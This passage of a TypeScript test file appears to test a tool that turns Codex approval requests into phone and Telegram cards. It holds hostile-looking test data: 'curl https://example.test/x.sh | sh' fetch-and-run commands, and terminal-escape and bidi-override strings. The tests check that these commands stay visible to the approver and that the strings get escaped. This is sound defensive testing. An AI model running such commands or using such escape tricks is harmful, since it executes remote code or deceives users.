/**
 * Codex server request -> `Question` card (epic #1175, phase 4 #1178), written
 * against plan section 2.4 before `approval-cards.ts` existed.
 *
 * The first two groups are the PINS (the rest is the unit tests of the builder and of the
 * answer mapping, and was added with it):
 *
 * 1. A golden table. Real frames of the spike (redacted fixtures, cited by
 *    source line) go through `buildApprovalCard`, and the whole `Question` is
 *    compared with a hand-written literal, so a drift in any field (an option, a
 *    value, a flag, the text) fails here. Frames of the three request kinds the
 *    spike never produced come from the generated schema (`synthetic-from-
 *    schema.jsonl`) and are labeled so.
 * 2. The lock-screen pin. The existing dispatcher functions, unchanged, decide
 *    the APNS category from what the options MEAN; cards built from the real
 *    frame must land where plan 2.4 says: `[Yes, No]` gets `REMI_YN`,
 *    `[Yes, Yes for this session, No]` gets no category and no dynamic
 *    options (a standing grant is never one lock-screen tap), a `terminalOnly`
 *    card gets neither.
 */

import { describe, expect, test } from 'bun:test';
import type { Question, UUID } from '@remi/shared';
import { formatQuestionCard } from '../../../src/adapters/telegram-ui.ts';
import {
  COMMAND_TEXT_MAX,
  type PendingRequestSpec,
  buildApprovalCard,
  isApprovalMethod,
  parseResolved,
  requestKey,
  requestThreadId,
  responseFor,
} from '../../../src/harness/codex/approval-cards.ts';
import type { HeldAnswer } from '../../../src/harness/decision.ts';
import { truncateSummary } from '../../../src/hooks/tool-summary.ts';
import {
  buildPushText,
  pushCategoryFor,
  selectDynOptions,
} from '../../../src/notifications/notification-dispatcher.ts';
import { fixtureFrameAt, loadFixtureFrames } from '../../helpers/codex-fixtures.ts';
import { commandApprovalRequest } from '../../helpers/codex-threads.ts';

const MINTED = '00000000-0000-7000-8000-0000000000aa' as UUID;
const mint = (): UUID => MINTED;

type Frame = { id: number | string; method: string; params: Record<string, unknown> };

/** A real request frame of the spike, by fixture file and source line. */
function realFrame(file: string, line: number): Frame {
  return fixtureFrameAt(file, line).frame as Frame;
}

const YES = {
  label: 'Yes',
  value: 'accept',
  isRecommended: true,
  isYes: true,
  isNo: false,
};
const NO = {
  label: 'No',
  value: 'cancel',
  isRecommended: false,
  isYes: false,
  isNo: true,
};

/** The card of a plain command approval: one Yes, one No, no free text. */
const commandCard = (command: string): Question => ({
  id: MINTED,
  text: `Allow Codex to run: ${command}`,
  options: [YES, NO],
  allowsFreeText: false,
  isAnswered: false,
  kind: 'permission',
});

describe('golden table: real frames to Question JSON', () => {
  const rows: Array<{ name: string; frame: Frame; question: Question; key: string }> = [
    {
      name: 'accept run, expA-accept.jsonl:47 (id 1)',
      frame: realFrame('expA-accept.jsonl', 47),
      question: commandCard("/bin/zsh -c 'touch spike-marker-A1'"),
      key: '00000000-0000-7000-8000-000000000001:1',
    },
    {
      name: 'decline run, expA-decline.jsonl:63 (id 2)',
      frame: realFrame('expA-decline.jsonl', 63),
      question: commandCard("/bin/zsh -lc 'touch spike-marker-A2'"),
      key: '00000000-0000-7000-8000-000000000005:2',
    },
    {
      name: 'a replayed request, expB3.jsonl:51 (id 5)',
      frame: realFrame('expB3.jsonl', 51),
      question: commandCard("/bin/zsh -lc 'touch spike-marker-Be'"),
      key: '00000000-0000-7000-8000-000000000009:5',
    },
  ];

  for (const row of rows) {
    test(`${row.name}: the whole card is as written, and the key includes the thread`, () => {
      const spec = buildApprovalCard(row.frame, mint, {});
      expect(spec).not.toBeNull();
      expect(spec?.question).toStrictEqual(row.question);
      // What goes over the wire is the same object.
      expect(JSON.parse(JSON.stringify(spec?.question))).toStrictEqual(row.question);
      expect(spec?.key).toBe(row.key);
      expect(spec?.actionable).toBe(true);
    });
  }

  test('the object-form decision the real frame lists is never offered', () => {
    const frame = realFrame('expA-accept.jsonl', 47);
    // The fixture really lists it (this is the claim the card is checked against).
    const listed = frame.params['availableDecisions'] as unknown[];
    expect(listed.some((d) => typeof d === 'object')).toBe(true);
    const spec = buildApprovalCard(frame, mint, {});
    expect(spec?.question.options.map((o) => o.value)).toEqual(['accept', 'cancel']);
    expect(JSON.stringify(spec)).not.toContain('Amendment');
  });

  test('a blocking user-input request (expC.jsonl:31) is a terminalOnly multi_question card with its questions mirrored', () => {
    const spec = buildApprovalCard(realFrame('expC.jsonl', 31), mint, {});
    expect(spec?.actionable).toBe(false);
    expect(spec?.question).toStrictEqual({
      id: MINTED,
      text: 'Pick a color?',
      options: [],
      allowsFreeText: false,
      isAnswered: false,
      kind: 'multi_question',
      terminalOnly: true,
      questions: [
        {
          header: 'Color',
          text: 'Pick a color?',
          multiSelect: false,
          options: [
            { label: 'Red', value: 'Red', isRecommended: false, isYes: false, isNo: false },
            { label: 'Blue', value: 'Blue', isRecommended: false, isYes: false, isNo: false },
          ],
        },
      ],
    });
  });

  test('file change, permissions and elicitation (synthetic-from-schema.jsonl, no real frame exists) are terminalOnly and say so', () => {
    const [fileChange, permissions, elicitation] = loadFixtureFrames(
      'synthetic-from-schema.jsonl',
    ).map((f) => f.frame as Frame);
    const texts = [fileChange, permissions, elicitation].map((frame) => {
      const spec = buildApprovalCard(frame as Frame, mint, {});
      expect(spec?.actionable).toBe(false);
      expect(spec?.question.terminalOnly).toBe(true);
      expect(spec?.question.options).toEqual([]);
      return spec?.question.text;
    });
    expect(texts).toEqual([
      'Codex asks to change files: synthetic file change. Answer it in the terminal.',
      'Codex asks for extra permissions (network): synthetic permissions. Answer it in the terminal.',
      'MCP server test-server asks: synthetic elicitation. Answer it in the terminal.',
    ]);
  });
});

describe('lock-screen pin: the unchanged dispatcher reads the cards by meaning', () => {
  const listed = (decisions: unknown[]): Question => {
    const frame = realFrame('expA-accept.jsonl', 47);
    const spec = buildApprovalCard(
      { ...frame, params: { ...frame.params, availableDecisions: decisions } },
      mint,
      {},
    );
    if (!spec) throw new Error('no card');
    return spec.question;
  };

  test('[Yes, No] from the real frame gets REMI_YN, with dynamic options', () => {
    const card = buildApprovalCard(realFrame('expA-accept.jsonl', 47), mint, {})
      ?.question as Question;
    expect(card.options.map((o) => o.label)).toEqual(['Yes', 'No']);
    expect(pushCategoryFor(card)).toBe('REMI_YN');
    expect(selectDynOptions(card)).toBe(true);
  });

  test('[Yes, Yes for this session, No] gets no category and no dynamic options (a standing grant is never a lock-screen tap)', () => {
    const card = listed(['accept', 'acceptForSession', 'cancel']);
    expect(card.options.map((o) => o.label)).toEqual(['Yes', 'Yes, for this session', 'No']);
    expect(card.options[1]?.standingGrant).toBe('session');
    expect(pushCategoryFor(card)).toBeUndefined();
    expect(selectDynOptions(card)).toBe(false);
  });

  test('a terminalOnly card gets neither', () => {
    const card = buildApprovalCard(realFrame('expC.jsonl', 31), mint, {})?.question as Question;
    expect(card.terminalOnly).toBe(true);
    expect(pushCategoryFor(card)).toBeUndefined();
    expect(selectDynOptions(card)).toBe(false);
  });
});

const THREAD = '00000000-0000-7000-8000-0000000000b1';
const OTHER_THREAD = '00000000-0000-7000-8000-0000000000b2';

/** A command approval of `THREAD` built from the real frame, with `over` applied to its params. */
function build(
  over: Record<string, unknown> = {},
  opts: { agentId?: string } = {},
  command = 'touch unit-marker',
  id = 7,
): PendingRequestSpec {
  const { method, params } = commandApprovalRequest(THREAD, command, over);
  const spec = buildApprovalCard({ id, method, params }, mint, opts);
  if (spec === null) throw new Error('no card');
  return spec;
}

const optionsOf = (spec: PendingRequestSpec): string[][] =>
  spec.question.options.map((o) => [o.label, o.value]);

const yesAnswer = (spec: PendingRequestSpec): HeldAnswer => ({
  kind: 'option',
  option: spec.question.options[0] as Question['options'][number],
});

describe('options come only from what the request lists', () => {
  const OBJECT_FORMS = [
    { acceptWithExecpolicyAmendment: { execpolicy_amendment: ['touch', 'x'] } },
    { applyNetworkPolicyAmendment: { network_policy_amendment: { host: 'example.test' } } },
  ];

  const answerable: Array<{ listed: unknown; options: string[][] }> = [
    {
      listed: ['accept', 'cancel'],
      options: [
        ['Yes', 'accept'],
        ['No', 'cancel'],
      ],
    },
    {
      listed: ['accept', 'decline'],
      options: [
        ['Yes', 'accept'],
        ['No', 'decline'],
      ],
    },
    // Both listed: the TUI's own No is `cancel`.
    {
      listed: ['accept', 'decline', 'cancel'],
      options: [
        ['Yes', 'accept'],
        ['No', 'cancel'],
      ],
    },
    {
      listed: ['accept', 'acceptForSession', 'decline'],
      options: [
        ['Yes', 'accept'],
        ['Yes, for this session', 'acceptForSession'],
        ['No', 'decline'],
      ],
    },
    // The object forms are ignored, wherever they sit in the list.
    {
      listed: [...OBJECT_FORMS, 'accept', 'cancel'],
      options: [
        ['Yes', 'accept'],
        ['No', 'cancel'],
      ],
    },
    // No list at all: accept and decline, the verified pair.
    {
      listed: undefined,
      options: [
        ['Yes', 'accept'],
        ['No', 'decline'],
      ],
    },
    {
      listed: null,
      options: [
        ['Yes', 'accept'],
        ['No', 'decline'],
      ],
    },
  ];

  for (const { listed, options } of answerable) {
    test(`listed ${JSON.stringify(listed)} gives ${options.map((o) => o[1]).join(', ')}`, () => {
      const spec = build({ availableDecisions: listed });
      expect(spec.actionable).toBe(true);
      expect(optionsOf(spec)).toEqual(options);
      expect(spec.noResponse).toEqual({ decision: options.at(-1)?.[1] });
    });
  }

  // No Yes, no No, an empty list, only object forms, or a list that is not a list: nothing to send.
  for (const listed of [
    ['accept'],
    ['cancel'],
    ['decline'],
    [],
    OBJECT_FORMS,
    'accept',
    { 0: 'accept' },
  ]) {
    test(`listed ${JSON.stringify(listed)} cannot be answered from the phone, and says so`, () => {
      const spec = build({ availableDecisions: listed });
      expect(spec.actionable).toBe(false);
      expect(spec.question.terminalOnly).toBe(true);
      expect(spec.question.options).toEqual([]);
      expect(spec.question.text).toContain('touch unit-marker');
      expect(spec.question.text).toContain('terminal');
    });
  }

  test('whatever subset of decisions is listed, every result the card can send is one of them', () => {
    const all = ['accept', 'acceptForSession', 'decline', 'cancel'];
    let cards = 0;
    for (let mask = 0; mask < 1 << all.length; mask++) {
      const listed = all.filter((_, i) => (mask >> i) & 1);
      const spec = build({ availableDecisions: [...OBJECT_FORMS, ...listed] });
      if (!spec.actionable) continue;
      cards += 1;
      const answers: HeldAnswer[] = [
        { kind: 'cancel' },
        ...spec.question.options.map((o): HeldAnswer => ({ kind: 'option', option: o })),
      ];
      for (const answer of answers) {
        const mapped = responseFor(spec, answer);
        expect(mapped.ok).toBe(true);
        const decision = (mapped as { result: { decision: string } }).result.decision;
        expect(listed, `${decision} from ${JSON.stringify(listed)}`).toContain(decision);
      }
    }
    expect(cards).toBeGreaterThan(0);
  });
});

describe('what makes a command approval more than the command', () => {
  const extras: Array<[string, Record<string, unknown>]> = [
    ['a stdin write', { kind: 'writeStdin' }],
    ['no kind', { kind: undefined }],
    ['an approval id', { approvalId: 'approval-1' }],
    ['extra permissions', { additionalPermissions: { network: { enabled: true } } }],
    ['a network approval context', { networkApprovalContext: { host: 'example.test' } }],
    [
      'proposed network policy amendments',
      { proposedNetworkPolicyAmendments: [{ host: 'example.test' }] },
    ],
  ];
  for (const [what, over] of extras) {
    test(`${what} makes it terminalOnly, with the command still shown`, () => {
      const spec = build(over);
      expect(spec.actionable).toBe(false);
      expect(spec.question.terminalOnly).toBe(true);
      expect(spec.question.text).toBe(
        'Codex asks to run: touch unit-marker. Answer it in the terminal.',
      );
    });
  }

  test('the real frame omits approvalId: a null or a missing one is the plain command', () => {
    expect(build({ approvalId: null }).actionable).toBe(true);
    expect(build({ approvalId: undefined }).actionable).toBe(true);
  });

  test('a command that is not text, or is empty, is a generic terminalOnly card', () => {
    for (const command of [undefined, '', 42, null]) {
      const spec = build({ command }, {}, 'unused');
      expect(spec.actionable).toBe(false);
      expect(spec.question.text).toBe('Codex is asking for approval; answer it in the terminal');
    }
  });

  test('a command that is too long to show in full is terminalOnly and is not shown cut', () => {
    const long = `echo ${'x'.repeat(COMMAND_TEXT_MAX)}`;
    const spec = build({}, {}, long);
    expect(spec.actionable).toBe(false);
    expect(spec.question.text).toBe(
      `Codex asks to run a command too long to show (${long.length} characters). Answer it in the terminal.`,
    );
    // The longest one that fits is still a card, and its whole command is on it (`detail`; the
    // text is the cut form a lock screen can show).
    const fits = 'y'.repeat(COMMAND_TEXT_MAX);
    const ok = build({}, {}, fits);
    expect(ok.actionable).toBe(true);
    expect(ok.question.detail).toBe(fits);
    expect(ok.question.text).toBe(`Allow Codex to run: ${truncateSummary(fits)}`);
  });

  test("Codex's stated reason follows the command, cut when long, and never replaces it", () => {
    const spec = build({ reason: 'needs the network' });
    expect(spec.question.text).toBe(
      "Allow Codex to run: touch unit-marker\nCodex's stated reason: needs the network",
    );
    const longReason = build({ reason: 'r'.repeat(400) });
    expect(longReason.question.text).toBe(
      `Allow Codex to run: touch unit-marker\nCodex's stated reason: ${'r'.repeat(300)}...`,
    );
    expect(build({ reason: '' }).question.text).toBe('Allow Codex to run: touch unit-marker');
  });

  test("a subagent's request is always terminalOnly, carries the agent, and says so", () => {
    const spec = build({}, { agentId: OTHER_THREAD });
    expect(spec.actionable).toBe(false);
    expect(spec.question.terminalOnly).toBe(true);
    expect(spec.question.agentId).toBe(OTHER_THREAD);
    expect(spec.question.text).toBe(
      'Subagent · Codex asks to run: touch unit-marker. Answer it in the terminal.',
    );
    expect(spec.question.options).toEqual([]);
  });
});

describe('the other kinds of request', () => {
  const frame = (method: string, params: Record<string, unknown>) => ({ id: 3, method, params });

  test('a method remi has no card for is null, however it is spelled', () => {
    for (const method of [
      'item/tool/call',
      'account/chatgptAuthTokens/refresh',
      'attestation/generate',
      'currentTime/read',
      'applyPatchApproval',
      'execCommandApproval',
      'item/commandExecution/requestApproval/',
      'Item/commandExecution/requestApproval',
      '',
    ]) {
      expect(buildApprovalCard(frame(method, { threadId: THREAD }), mint, {}), method).toBeNull();
      expect(isApprovalMethod(method), method).toBe(false);
    }
    expect(isApprovalMethod('item/commandExecution/requestApproval')).toBe(true);
  });

  test('a request that does not say which thread it is about is null, even for a known method', () => {
    for (const params of [
      {},
      { threadId: '' },
      { threadId: 5 },
      null,
      'text',
      [THREAD],
      undefined,
    ]) {
      expect(
        buildApprovalCard(
          { id: 3, method: 'item/commandExecution/requestApproval', params },
          mint,
          {},
        ),
      ).toBeNull();
    }
  });

  test('a known method whose fields do not parse is a generic terminalOnly card, not a dropped request', () => {
    const generic = 'Codex is asking for approval; answer it in the terminal';
    const cases = [
      frame('item/tool/requestUserInput', { threadId: THREAD, questions: 'nope' }),
      frame('item/tool/requestUserInput', { threadId: THREAD, questions: [] }),
      frame('item/tool/requestUserInput', { threadId: THREAD, questions: [{ id: 'q1' }] }),
      frame('mcpServer/elicitation/request', { threadId: THREAD }),
      frame('item/commandExecution/requestApproval', { threadId: THREAD }),
    ];
    for (const c of cases) {
      const spec = buildApprovalCard(c, mint, {});
      expect(spec?.question.text, c.method).toBe(generic);
      expect(spec?.actionable).toBe(false);
      expect(spec?.question.terminalOnly).toBe(true);
    }
  });

  test('a file change names its reason and its grant root; permissions name what they ask for', () => {
    const fileChange = buildApprovalCard(
      frame('item/fileChange/requestApproval', {
        threadId: THREAD,
        reason: 'edit the config',
        grantRoot: '/work/project',
      }),
      mint,
      {},
    );
    expect(fileChange?.question.text).toBe(
      'Codex asks to change files: edit the config (write access under /work/project). Answer it in the terminal.',
    );
    const bare = buildApprovalCard(
      frame('item/fileChange/requestApproval', { threadId: THREAD, grantRoot: null }),
      mint,
      {},
    );
    expect(bare?.question.text).toBe('Codex asks to change files. Answer it in the terminal.');
    const permissions = buildApprovalCard(
      frame('item/permissions/requestApproval', {
        threadId: THREAD,
        permissions: { network: { enabled: true }, fileSystem: null, other: {} },
      }),
      mint,
      {},
    );
    expect(permissions?.question.text).toBe(
      'Codex asks for extra permissions (network, other). Answer it in the terminal.',
    );
  });

  test('an elicitation in url mode shows the host and nothing else of the url', () => {
    const spec = buildApprovalCard(
      frame('mcpServer/elicitation/request', {
        threadId: THREAD,
        serverName: 'srv',
        message: 'sign in',
        mode: 'url',
        url: 'https://user:secret@auth.example.test/path?token=abc#frag',
      }),
      mint,
      {},
    );
    expect(spec?.question.text).toBe(
      'MCP server srv asks: sign in (auth.example.test). Answer it in the terminal.',
    );
    expect(JSON.stringify(spec)).not.toContain('secret');
    expect(JSON.stringify(spec)).not.toContain('token');
  });

  test('a user-input request keeps every question and option, and skips an option with no label', () => {
    const spec = buildApprovalCard(
      frame('item/tool/requestUserInput', {
        threadId: THREAD,
        questions: [
          {
            id: 'q1',
            header: 'Pick',
            question: 'First?',
            options: [
              { label: 'A', description: 'the first' },
              { description: 'no label' },
              'junk',
            ],
          },
          { id: 'q2', question: 'Second?', options: [] },
        ],
      }),
      mint,
      {},
    );
    expect(spec?.question.text).toBe('First?');
    expect(spec?.question.questions).toEqual([
      {
        header: 'Pick',
        text: 'First?',
        multiSelect: false,
        options: [
          {
            label: 'A',
            value: 'A',
            description: 'the first',
            isRecommended: false,
            isYes: false,
            isNo: false,
          },
        ],
      },
      { text: 'Second?', multiSelect: false, options: [] },
    ]);
  });

  test('building a card does not change the request it was built from', () => {
    const { method, params } = commandApprovalRequest(THREAD, 'touch unit-marker');
    const before = JSON.stringify(params);
    buildApprovalCard({ id: 1, method, params }, mint, {});
    expect(JSON.stringify(params)).toBe(before);
  });
});

describe('what a card carries fits the clients that read it', () => {
  test("Telegram's callback data for any option of any card stays within its 64 bytes", () => {
    const longest = build({
      availableDecisions: ['accept', 'acceptForSession', 'decline', 'cancel'],
    });
    const values = longest.question.options.map((o) => o.value);
    expect(values).toHaveLength(3);
    for (const value of values) {
      // The format `formatQuestionKeyboard` builds: `answer:<question id>:<option value>`.
      const callback = `answer:${crypto.randomUUID()}:${value}`;
      expect(new TextEncoder().encode(callback).length, value).toBeLessThanOrEqual(64);
    }
  });
});

describe('the key names a request by thread and id', () => {
  test('the same id on two threads is two requests', () => {
    expect(requestKey(THREAD, 5)).not.toBe(requestKey(OTHER_THREAD, 5));
    expect(build({}, {}, 'a', 5).key).toBe(`${THREAD}:5`);
    expect(build({ threadId: OTHER_THREAD }, {}, 'a', 5).key).toBe(`${OTHER_THREAD}:5`);
  });

  test('requestThreadId and parseResolved read only well-formed params', () => {
    expect(requestThreadId({ threadId: THREAD })).toBe(THREAD);
    for (const bad of [null, undefined, 'x', [], {}, { threadId: '' }, { threadId: 1 }]) {
      expect(requestThreadId(bad)).toBeNull();
    }
    expect(parseResolved({ threadId: THREAD, requestId: 5 })).toEqual({
      threadId: THREAD,
      requestId: 5,
    });
    expect(parseResolved({ threadId: THREAD, requestId: 'r-5' })).toEqual({
      threadId: THREAD,
      requestId: 'r-5',
    });
    for (const bad of [
      null,
      {},
      { threadId: THREAD },
      { requestId: 5 },
      { threadId: THREAD, requestId: '' },
      { threadId: THREAD, requestId: Number.NaN },
      { threadId: THREAD, requestId: {} },
      { threadId: '', requestId: 5 },
    ]) {
      expect(parseResolved(bad), JSON.stringify(bad)).toBeNull();
    }
  });
});

describe('responseFor: a phone answer to the result Codex expects, or a refusal', () => {
  const session = () => build({ availableDecisions: ['accept', 'acceptForSession', 'cancel'] });

  test('each option sends exactly its own decision; Cancel sends the No decision', () => {
    const spec = session();
    const [yes, forSession, no] = spec.question.options as Question['options'];
    const option = (o: Question['options'][number]): HeldAnswer => ({ kind: 'option', option: o });
    expect(responseFor(spec, option(yes as never))).toEqual({
      ok: true,
      result: { decision: 'accept' },
    });
    expect(responseFor(spec, option(forSession as never))).toEqual({
      ok: true,
      result: { decision: 'acceptForSession' },
    });
    expect(responseFor(spec, option(no as never))).toEqual({
      ok: true,
      result: { decision: 'cancel' },
    });
    expect(responseFor(spec, { kind: 'cancel' })).toEqual({
      ok: true,
      result: { decision: 'cancel' },
    });
  });

  test('an option the card does not carry is refused: unknown value, a copy with another label, or a decision it never listed', () => {
    const spec = build({ availableDecisions: ['accept', 'cancel'] });
    const yes = spec.question.options[0] as Question['options'][number];
    const refused = { ok: false, why: 'unknown-option' } as const;
    expect(
      responseFor(spec, { kind: 'option', option: { ...yes, value: 'acceptForSession' } }),
    ).toEqual(refused);
    expect(
      responseFor(spec, { kind: 'option', option: { ...yes, value: 'decline', label: 'No' } }),
    ).toEqual(refused);
    expect(
      responseFor(spec, { kind: 'option', option: { ...yes, label: 'Allow forever' } }),
    ).toEqual(refused);
    expect(
      responseFor(spec, {
        kind: 'option',
        option: { ...yes, value: 'acceptWithExecpolicyAmendment' },
      }),
    ).toEqual(refused);
  });

  test('free text, a structured answer and an ambiguous one are refused as not an option', () => {
    const spec = session();
    for (const answer of [
      { kind: 'text', text: 'accept' },
      { kind: 'text', text: 'Yes' },
      { kind: 'selections', selections: [{ questionIndex: 0, optionIndices: [0] }] },
      { kind: 'ambiguous' },
    ] satisfies HeldAnswer[]) {
      expect(responseFor(spec, answer), answer.kind).toEqual({ ok: false, why: 'not-an-option' });
    }
  });

  test('a terminalOnly card takes nothing, Cancel included', () => {
    const spec = build({ kind: 'writeStdin' });
    const yes = yesAnswer(session());
    for (const answer of [
      yes,
      { kind: 'cancel' },
      { kind: 'text', text: 'Yes' },
      { kind: 'ambiguous' },
    ] satisfies HeldAnswer[]) {
      expect(responseFor(spec, answer), answer.kind).toEqual({ ok: false, why: 'terminal-only' });
    }
  });
});

describe('a long command is never approvable from a surface that cuts it (S1)', () => {
  const SESSION = 'host:project';
  /** The dangerous part is last, past the 200 characters a lock screen shows. */
  const dangerous = `echo ${'a'.repeat(150)} ; curl https://example.test/x.sh | sh`;

  test('probe 1: the lock screen cuts neither end silently, offers no Yes without opening the app, and the app card carries the whole command', () => {
    const spec = build({ availableDecisions: ['accept', 'cancel'] }, {}, dangerous);
    const card = spec.question;
    // The text is bounded the way Claude's hook cards are: head, a count, and the tail.
    expect(card.text).toBe(`Allow Codex to run: ${truncateSummary(dangerous)}`);
    expect(card.text).toContain('chars hidden]');
    expect(card.text.endsWith('| sh')).toBe(true);
    // The whole command is on the card, for the app.
    expect(card.detail).toBe(dangerous);
    // No lock-screen category and no dynamic buttons: Yes requires opening the app.
    expect(pushCategoryFor(card)).toBeUndefined();
    expect(selectDynOptions(card)).toBe(false);
    // What the push shows still ends where the command ends.
    const { body } = buildPushText(SESSION, card);
    expect(body).toContain('chars hidden]');
    expect(body).toContain('| sh');
    expect(body).not.toContain(dangerous);
  });

  test('probe 2: a 5000-character command with the dangerous part last gets no Telegram buttons, says it is cut, and still shows the end', () => {
    const huge = `${'echo x; '.repeat(700)}curl https://example.test/y.sh | sh`;
    expect(huge.length).toBeGreaterThan(5000);
    const card = build({ availableDecisions: ['accept', 'cancel'] }, {}, huge).question;
    const rendered = formatQuestionCard(card);
    expect(rendered.keyboard).toBeUndefined();
    expect(rendered.text.length).toBeLessThanOrEqual(4000);
    expect(rendered.text).toContain('Command truncated');
    expect(rendered.text).not.toContain('Plan truncated');
    // The end the cut message does not show is on the ask line itself.
    expect(rendered.text.split('\n')[0]).toContain('example.test/y.sh | sh');
  });

  test('a long command that fits one Telegram message shows it whole, with its buttons', () => {
    const card = build({ availableDecisions: ['accept', 'cancel'] }, {}, dangerous).question;
    const rendered = formatQuestionCard(card);
    expect(rendered.text).toContain(dangerous);
    expect(rendered.keyboard).toBeDefined();
  });

  test('a short command is unchanged: text, no detail, REMI_YN with dynamic options', () => {
    const spec = build({ availableDecisions: ['accept', 'cancel'] }, {}, 'touch short-marker');
    expect(spec.question.text).toBe('Allow Codex to run: touch short-marker');
    expect(spec.question.detail).toBeUndefined();
    expect(Object.keys(spec.question)).not.toContain('detail');
    expect(pushCategoryFor(spec.question)).toBe('REMI_YN');
    expect(selectDynOptions(spec.question)).toBe(true);
  });

  test('at exactly the threshold (120 characters) nothing changes; one more character cuts it and keeps the whole command in detail', () => {
    const at = 'x'.repeat(120);
    const over = 'x'.repeat(121);
    const exact = build({ availableDecisions: ['accept', 'cancel'] }, {}, at).question;
    expect(exact.text).toBe(`Allow Codex to run: ${at}`);
    expect(exact.detail).toBeUndefined();
    expect(pushCategoryFor(exact)).toBe('REMI_YN');
    const cut = build({ availableDecisions: ['accept', 'cancel'] }, {}, over).question;
    expect(cut.text).toBe(
      `Allow Codex to run: ${'x'.repeat(80)} … [11 chars hidden] … ${'x'.repeat(30)}`,
    );
    expect(cut.detail).toBe(over);
    expect(pushCategoryFor(cut)).toBeUndefined();
    expect(selectDynOptions(cut)).toBe(false);
  });

  test("Codex's stated reason follows the cut command and does not displace its tail from the push body", () => {
    const card = build(
      { availableDecisions: ['accept', 'cancel'], reason: 'r'.repeat(300) },
      {},
      dangerous,
    ).question;
    const { body } = buildPushText(SESSION, card);
    expect(body).toContain('| sh');
  });

  test('a push for a card with detail shows the ask, not the start of the detail, unless it is a plan', () => {
    const card = build({ availableDecisions: ['accept', 'cancel'] }, {}, dangerous).question;
    const { body } = buildPushText(SESSION, card);
    expect(body.startsWith('Allow Codex to run: ')).toBe(true);
    const plan: Question = {
      id: MINTED,
      text: 'Approve the plan?',
      options: [],
      allowsFreeText: false,
      isAnswered: false,
      kind: 'plan_approval',
      detail: 'Step one then step two',
    };
    expect(buildPushText(SESSION, plan).body).toBe('Step one then step two');
  });

  test("Claude's cards are untouched: a permission card without detail keeps its category and buttons, a plan keeps none", () => {
    const claudePermission: Question = {
      id: MINTED,
      text: 'Allow Bash: ls',
      options: [
        { label: 'Yes', value: '1', isRecommended: true, isYes: true, isNo: false },
        { label: 'No', value: '2', isRecommended: false, isYes: false, isNo: true },
      ],
      allowsFreeText: false,
      isAnswered: false,
      kind: 'permission',
    };
    expect(pushCategoryFor(claudePermission)).toBe('REMI_YN');
    expect(selectDynOptions(claudePermission)).toBe(true);
    expect(
      pushCategoryFor({ ...claudePermission, kind: 'plan_approval', detail: 'plan' }),
    ).toBeUndefined();
  });
});

describe('text a hostile server controls is escaped before any client sees it (S5)', () => {
  /** A clipboard write, a line overwrite with a carriage return, a bidi override and isolate, a zero-width space. */
  /** Built from code points, so this source never holds a raw bidi or zero-width character. */
  const ch = (...codes: number[]): string => String.fromCharCode(...codes);
  const hostile = `ok\x1b]52;c;QUJD\x07 \x1b[2K\r ${ch(0x202e)}fdp.exe${ch(0x2066)}${ch(0x200b)}`;
  const escaped = 'ok\\u001B]52;c;QUJD\\u0007 \\u001B[2K\\u000D \\u202Efdp.exe\\u2066\\u200B';
  const isUnsafeCode = (c: number): boolean =>
    (c <= 0x1f && c !== 0x09 && c !== 0x0a) ||
    (c >= 0x7f && c <= 0x9f) ||
    (c >= 0x200b && c <= 0x200f) ||
    c === 0x2028 ||
    c === 0x2029 ||
    (c >= 0x202a && c <= 0x202e) ||
    (c >= 0x2066 && c <= 0x2069);
  const hasUnsafe = (text: string): boolean =>
    [...text].some((ch) => isUnsafeCode(ch.charCodeAt(0)));

  /** Every string anywhere in a card: what a client could render. */
  function strings(value: unknown): string[] {
    if (typeof value === 'string') return [value];
    if (Array.isArray(value)) return value.flatMap(strings);
    if (typeof value === 'object' && value !== null) return Object.values(value).flatMap(strings);
    return [];
  }
  const frame = (method: string, params: Record<string, unknown>) => ({ id: 3, method, params });
  const card = (f: ReturnType<typeof frame>, opts: { agentId?: string } = {}): Question => {
    const spec = buildApprovalCard(f, mint, opts);
    if (spec === null) throw new Error('no card');
    return spec.question;
  };
  const clean = (q: Question): void => {
    for (const text of strings(q)) expect(hasUnsafe(text), JSON.stringify(text)).toBe(false);
  };

  test('a command: the text and the reason come out escaped, and a long one keeps its escaped whole in detail', () => {
    const q = build({ reason: hostile }, {}, `ls ${hostile}`).question;
    clean(q);
    expect(q.text).toBe(`Allow Codex to run: ls ${escaped}\nCodex's stated reason: ${escaped}`);
    const long = build(
      { availableDecisions: ['accept', 'cancel'] },
      {},
      `${hostile}${'x'.repeat(200)}`,
    ).question;
    clean(long);
    expect(long.detail).toBe(`${escaped}${'x'.repeat(200)}`);
  });

  test('a command that is only long because of what escaping makes of it is terminalOnly, never cut', () => {
    const bidi = ch(0x202e).repeat(COMMAND_TEXT_MAX / 2);
    const spec = build({}, {}, bidi);
    expect(spec.actionable).toBe(false);
    expect(spec.question.text).toContain('too long to show');
    clean(spec.question);
  });

  test('a terminalOnly command (a stdin write) shows its escaped text too', () => {
    const q = build({ kind: 'writeStdin' }, {}, hostile).question;
    clean(q);
    expect(q.text).toBe(`Codex asks to run: ${escaped}. Answer it in the terminal.`);
  });

  test("a subagent's command is escaped too", () => {
    clean(build({}, { agentId: OTHER_THREAD }, hostile).question);
  });

  test('a file change: the reason and the grant root', () => {
    const q = card(
      frame('item/fileChange/requestApproval', {
        threadId: THREAD,
        reason: hostile,
        grantRoot: hostile,
      }),
    );
    clean(q);
    expect(q.text).toBe(
      `Codex asks to change files: ${escaped} (write access under ${escaped}). Answer it in the terminal.`,
    );
  });

  test('permissions: the reason and the names of what is asked for', () => {
    const q = card(
      frame('item/permissions/requestApproval', {
        threadId: THREAD,
        reason: hostile,
        permissions: { [hostile]: { enabled: true } },
      }),
    );
    clean(q);
    expect(q.text).toBe(
      `Codex asks for extra permissions (${escaped}): ${escaped}. Answer it in the terminal.`,
    );
  });

  test('an MCP elicitation: the server name and the message', () => {
    const q = card(
      frame('mcpServer/elicitation/request', {
        threadId: THREAD,
        serverName: hostile,
        message: hostile,
      }),
    );
    clean(q);
    expect(q.text).toBe(`MCP server ${escaped} asks: ${escaped}. Answer it in the terminal.`);
  });

  test('a user-input question: header, question text, option labels and descriptions', () => {
    const q = card(
      frame('item/tool/requestUserInput', {
        threadId: THREAD,
        questions: [
          {
            id: 'q1',
            header: hostile,
            question: hostile,
            options: [{ label: hostile, description: hostile }],
          },
        ],
      }),
    );
    clean(q);
    expect(q.text).toBe(escaped);
    expect(q.questions?.[0]?.header).toBe(escaped);
    expect(q.questions?.[0]?.options[0]?.label).toBe(escaped);
    expect(q.questions?.[0]?.options[0]?.description).toBe(escaped);
  });

  test('ordinary text with a newline and a tab is untouched', () => {
